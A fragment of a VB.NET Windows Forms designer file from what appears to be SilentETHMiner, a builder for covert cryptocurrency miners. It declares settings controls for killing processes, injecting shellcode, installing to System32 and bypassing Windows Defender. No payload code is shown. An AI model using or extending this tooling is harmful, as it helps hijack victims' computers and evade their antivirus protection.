...
Partial Class Advanced
    ...
    Private Sub InitializeComponent()
        ...
        Me.toggleProcessKiller = New SilentETHMiner.MephToggleSwitch()
        Me.txtKillTargers = New SilentETHMiner.MephTextBox()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.toggleShellcode = New SilentETHMiner.MephToggleSwitch()
        ...
        Me.Label7.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label7, "Will try to install to System32, if unsuccessful it will try to install to the pa" &
        "th chosen in the ""Install"" tab. This command requires Administrator privileges!" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10))
        '
        'Label9
        '
        ...
        "r the Bypass Windows Defender option.")
        '
        'Label26
        '
